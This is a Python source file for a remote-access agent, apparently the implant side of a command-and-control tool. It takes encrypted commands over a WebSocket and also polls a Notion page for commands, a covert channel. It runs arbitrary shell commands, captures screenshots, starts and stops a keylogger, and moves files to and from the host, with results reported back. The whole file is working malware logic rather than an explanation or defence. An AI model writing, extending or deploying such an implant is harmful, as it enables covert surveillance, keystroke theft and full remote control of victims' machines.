import asyncio
import websockets
import json
import os
from crypto_utils import CryptoUtils
from agent_utils import AgentUtils
from notion_client import NotionClient
import base64
from datetime import datetime
import time

class Agent:
    def __init__(self, server_url, notion_page_id, check_interval=60):
        self.server_url = server_url
        self.crypto = CryptoUtils()
        self.agent_utils = AgentUtils()
        self.notion_client = NotionClient(notion_page_id)
        self.check_interval = check_interval
        self.websocket = None

    async def connect(self):
        while True:
            try:
                async with websockets.connect(self.server_url) as websocket:
                    self.websocket = websocket
                    # 发送身份信息
                    await self.send_message({
                        'type': 'agent',
                        'timestamp': datetime.now().isoformat()
                    })
                    
                    # 处理来自服务器的消息
                    async for message in websocket:
                        await self.handle_command(message)
            except Exception as e:
                print(f"Connection error: {str(e)}")
                await asyncio.sleep(10)  # 等待10秒后重试

    async def handle_command(self, encrypted_message):
        try:
            # 解密并解析命令
            decrypted_message = self.crypto.decrypt(encrypted_message)
            command = json.loads(decrypted_message)
            
            response = await self.execute_command(command)
            
            # 加密并发送响应
            await self.send_message(response)
        except Exception as e:
            error_response = {
                'status': 'error',
                'message': str(e),
                'timestamp': datetime.now().isoformat()
            }
            await self.send_message(error_response)

    async def send_message(self, message):
        if self.websocket:
            encrypted_message = self.crypto.encrypt(json.dumps(message))
            await self.websocket.send(encrypted_message)

    async def execute_command(self, command):
        command_type = command.get('type')
        command_data = command.get('data', {})
        
        if command_type == 'shell':
            return self.agent_utils.execute_command(command_data['command'])
        
        elif command_type == 'screenshot':
            return self.agent_utils.take_screenshot()
        
        elif command_type == 'keylogger_start':
            return self.agent_utils.start_keylogger()
        
        elif command_type == 'keylogger_stop':
            return self.agent_utils.stop_keylogger()
        
        elif command_type == 'upload':
            return self.agent_utils.upload_file(
                command_data['path'],
                command_data['content']
            )
        
        elif command_type == 'download':
            return self.agent_utils.download_file(command_data['path'])
        
        else:
            return {
                'status': 'error',
                'message': f'Unknown command type: {command_type}'
            }

    async def check_notion_commands(self):
        while True:
            try:
                result = self.notion_client.check_for_commands()
                if result['status'] == 'success' and result['commands']:
                    for command in result['commands']:
                        response = await self.execute_command(command)
                        # 更新命令执行结果到Notion页面
                        self.notion_client.update_result(command.get('id'), response)
            except Exception as e:
                print(f"Error checking Notion commands: {str(e)}")
            
            await asyncio.sleep(self.check_interval)

    async def start(self):
        # 同时运行WebSocket连接和Notion命令检查
        await asyncio.gather(
            self.connect(),
            self.check_notion_commands()
        )

def main():
    # 从环境变量或配置文件获取这些值
    server_url = "ws://localhost:8765"
    notion_page_id = "your-notion-page-id"
    check_interval = 60
    
    agent = Agent(server_url, notion_page_id, check_interval)
    asyncio.run(agent.start())

if __name__ == '__main__':
    main() 